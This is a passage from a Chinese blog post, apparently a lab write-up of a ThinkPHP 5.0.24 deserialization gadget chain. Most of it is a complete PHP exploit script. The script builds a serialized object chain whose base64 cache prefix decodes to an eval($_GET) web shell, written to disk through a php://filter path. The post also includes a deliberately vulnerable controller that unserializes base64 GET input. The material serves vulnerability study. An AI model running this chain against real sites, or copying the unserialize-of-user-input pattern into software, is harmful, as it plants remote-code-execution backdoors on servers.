+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected function setTagItem($name)</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;tag) &#123;</span><br><span class="line">        $key       = &#x27;tag_&#x27; . md5($this-&gt;tag); //$this-&gt;tag=&#x27;123&#x27;</span><br><span class="line">        $this-&gt;tag = null;</span><br><span class="line">        if ($this-&gt;has($key)) &#123;</span><br><span class="line">            $value   = explode(&#x27;,&#x27;, $this-&gt;get($key));</span><br><span class="line">            $value[] = $name;</span><br><span class="line">            $value   = implode(&#x27;,&#x27;, array_unique($value));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = $name; //PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4+$name</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;set($key, $value, 0); //$value=$filename,$key=tag_.md5(&#x27;123&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们输入的$key会变为$name，然后文件名为 ‘tag_’ . md5($this-&gt;tag)，最后再次进入File.php的set方法中，然后写入文件，按照以上的思路的exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files = [new \think\model\Merge];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">namespace think\model;</span><br><span class="line">use think\Model;</span><br><span class="line"> </span><br><span class="line">class Merge extends Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line"> </span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;append = [</span><br><span class="line">            &#x27;bb&#x27; =&gt; &#x27;getError&#x27;</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;error = (new \think\model\relation\BelongsTo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think;</span><br><span class="line">class Model&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">class BelongsTo</span><br><span class="line">&#123;</span><br><span class="line">    protected $query;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;query = (new \think\console\Output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">namespace think\console;</span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    protected $styles = [];</span><br><span class="line">    private $handle = null;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;styles = [&#x27;removeWhereField&#x27;];</span><br><span class="line">        $this-&gt;handle = (new \think\session\driver\Memcache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">namespace think\session\driver;</span><br><span class="line">class Memcache</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler = (new \think\cache\driver\Memcached);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver;</span><br><span class="line"></span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $handler = null;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27;   =&gt; 0,</span><br><span class="line">            &#x27;prefix&#x27;   =&gt; &#x27;PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4&#x27;,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;handler = (new File);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;tag = false;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27;        =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;cache_subdir&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;prefix&#x27;        =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27;          =&gt; &#x27;php://filter/convert.base64-decode/resource=./&#x27;,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(new \think\process\pipes\Windows));</span><br></pre></td></tr></table></figure>
+<p>然后在application的lndex.php文件中构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $a=$_GET[1];</span><br><span class="line">        unserialize(base64_decode($a));</span><br><span class="line">        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后get提交base64加密的值，即可在本目录下生成文件</p>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozhiru/p/12452528.html]">https://www.cnblogs.com/xiaozhiru/p/12452528.html]</a><br>    [<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41891666/article/details/107503710]">https://blog.csdn.net/qq_41891666/article/details/107503710]</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/10/30/ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ThinkPHP5.1.37反序列化链</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="Thinkphp5.0.24反序列化链" data-title="thinkPHP5.0.24反序列化链" data-url="http://example.com/2021/11/03/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="thinkPHP5.0.24反序列化链">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
